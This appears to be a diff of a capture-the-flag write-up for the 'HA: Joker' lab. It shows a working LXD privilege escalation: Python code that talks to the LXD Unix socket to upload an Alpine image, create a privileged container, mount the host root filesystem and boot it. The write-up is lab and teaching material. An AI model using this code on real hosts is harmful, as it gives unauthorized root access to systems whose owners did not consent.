@@ -1,4 +1,12 @@
-#  Privilege Escalation via Snap Confinement Bypass (LXD API Socket)
+# Privilege Escalation via Snap Confinement Bypass (LXD API Socket)
+
+**Target Name:** HA: Joker
+
+**IP Address:** 10.49.184.245 / 10.49.165.161
+
+**Difficulty:** Medium
+
+**Category:** Web / Privilege Escalation
 
 ## 1. Initial Reconnaissance & Enumeration
 
@@ -12,7 +20,7 @@ nmap -sV -sC 10.49.184.245
 
 The scan revealed three active ports:
 
-- **Port 22:** OpenSSH 8.2p1
+- **Port 22:** OpenSSH 8.2p1 (Ubuntu Linux)
     
 - **Port 80:** Apache httpd 2.4.41 (Title: `HA: Joker`)
     
@@ -140,7 +148,7 @@ See https://forum.snapcraft.io/t/11209 for details.
 
 On modern Ubuntu deployments, LXD is distributed via **Snap packaging**, which runs within a strict security sandbox. When executing the front-door `lxc` command-line utility, the snap daemon checks the real system home directory assigned within `/etc/passwd`.
 
-Because `www-data` defaults to the web server path (`/var/www`), which sits outside the standard `/home/` prefix, the sandbox environment gets triggered and locks up the command-line utility. Standard path spoofing tricks like exporting a fake `$HOME` environment variable are ignored by Snap.
+Because `www-data` defaults to the web server path (`/var/www`), which sits outside the standard `/home/` prefix, the sandbox environment gets triggered and locks up the command-line utility. Standard path spoofing tricks like exporting a fake `$HOME` environment variable are ignored by Snap. This is also why all standard public writeups and boilerplate exploit scripts failed out of the box—they assumed an unconfined `apt` environment.
 
 ## 5. Vulnerability 2: LXD Group Misconfiguration & Socket Exposure
 
@@ -150,11 +158,9 @@ Because the administrators assigned our low-privilege account (`www-data`) to th
 
 ## 6. Exploit Script Analysis & Root Reverse Shell
 
-A tailored Python script was executed to interact directly with the socket file (`/var/snap/lxd/common/lxd/unix.socket`), issuing raw API instructions to build a privileged backdoor container and mount the host's drive.
+To execute the exploit without relying on the broken client binaries, standalone Python automation scripts were executed from `/tmp` to upload the image and configure the hypervisor container directly.
 
-### Python Script Breakdown
-
-#### Step 1: Verifying Socket Communication
+### Step 1: Verifying Socket Communication
 
 First, a manual connection check was sent to ensure the daemon would accept direct HTTP requests from `www-data`:
 
@@ -170,9 +176,57 @@ print(s.recv(1024).decode())
 '
 ```
 
-The socket successfully returned a detailed JSON array, proving we could bypass the client restrictions entirely. An Alpine rootfs exploit image was then successfully imported, returning the identity fingerprint hash `cd73881adaac667ca3529972c7b380af240a9e3b09730f8c8e4e6a23e1a7892b`.
+The socket successfully returned a detailed JSON array, proving we could bypass the client restrictions entirely.
 
-#### Step 2: Creating the Privileged Container Framework
+### Step 2: Uploading the Exploit Image via Binary Stream
+
+Since the `lxc image import` CLI utility was dead in the water due to the Snap sandbox, we manually handled the binary upload process. This standalone Python routine reads the local Alpine rootfs archive from disk and streams its raw bytes directly over the Unix socket channel to the LXD database storage layer.
+
+Python
+
+```
+import socket
+import sys
+import time
+
+SOCKET_PATH = "/var/snap/lxd/common/lxd/unix.socket"
+IMAGE_FILE = "/tmp/alpine-v3.13-x86_64-20210218_0139.tar.gz"
+
+print("[*] Reading binary payload from disk...")
+try:
+    with open(IMAGE_FILE, "rb") as f:
+        file_data = f.read()
+except Exception as e:
+    print(f"[-] Error reading image file: {e}")
+    sys.exit(1)
+
+s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+s.connect(SOCKET_PATH)
+
+# Craft standard HTTP/1.1 upload headers for LXD API
+headers = (
+    "POST /1.0/images HTTP/1.1\r\n"
+    "Host: localhost\r\n"
+    "X-LXD-Fingerprint: \r\n"
+    "Content-Type: application/octet-stream\r\n"
+    f"Content-Length: {len(file_data)}\r\n"
+    "\r\n"
+)
+
+print("[*] Streaming raw file bytes to the LXD API socket...")
+s.sendall(headers.encode() + file_data)
+response = s.recv(4096).decode('utf-8', errors='ignore')
+s.close()
+
+print("[*] Waiting for daemon image verification sync...")
+time.sleep(3)
+```
+
+The daemon processed the raw byte stream and returned a permanent image identifier fingerprint hash: `cd73881adaac667ca3529972c7b380af240a9e3b09730f8c8e4e6a23e1a7892b`.
+
+### Step 3: Creating the Privileged Container Framework
+
+Because container management calls operate asynchronously, a second script was executed to handle instance creation, filesystem manipulation, and boot operations sequentially.
 
 The script issued a `POST` request to provision a new container instance named `privsec`:
 
@@ -188,7 +242,7 @@ send("POST", "/1.0/instances", {
 
 By setting `"security.privileged": "true"`, the script disabled the container's security safety features, turning it into a "super-container" capable of interacting directly with the core operating system hardware.
 
-#### Step 3: Mapping the Host Drive (The Master Trick)
+### Step 4: Mapping the Host Drive (The Master Trick)
 
 Next, the script issued a `PATCH` request to alter the hardware configuration of our new container:
 
@@ -209,7 +263,7 @@ send("PATCH", "/1.0/instances/privsec", {
 
 This is the core of the privilege escalation. It instructed LXD to take the actual, real hard drive of the victim host computer (the source `/`) and plug it directly into the container's internal filesystem layout at `/mnt/root`. Because the container was set as privileged, LXD allowed this drive mapping without restriction.
 
-#### Step 4: Activating the Instance
+### Step 5: Activating the Instance
 
 Finally, a `PUT` request triggered the virtual power button, booting up the backdoor container with the host's operating system strapped to its back:
 
@@ -245,7 +299,7 @@ By architectural design, when a fresh Alpine Linux container boots up, its defau
 
 ### Reaching Through the Portal
 
-Even though the shell was technically confined inside the mini-container, the host's physical file system was completely exposed via the `/mnt/root` folder mapped during Step 3.
+Even though the shell was technically confined inside the mini-container, the host's physical file system was completely exposed via the `/mnt/root` folder mapped during Step 4.
 
 By navigating through this directory portal, the container shell possessed the absolute authority to read the main server's restricted administration directories, allowing for immediate retrieval of the final flag file.
 
@@ -279,4 +333,6 @@ Plaintext
                                          
 !! Congrats you have finished this task !!
 ```
-🧑‍💻  https://tryhackme.com/p/4thul.exe
+
+---
+🧑‍💻 https://tryhackme.com/p/4thul.exe
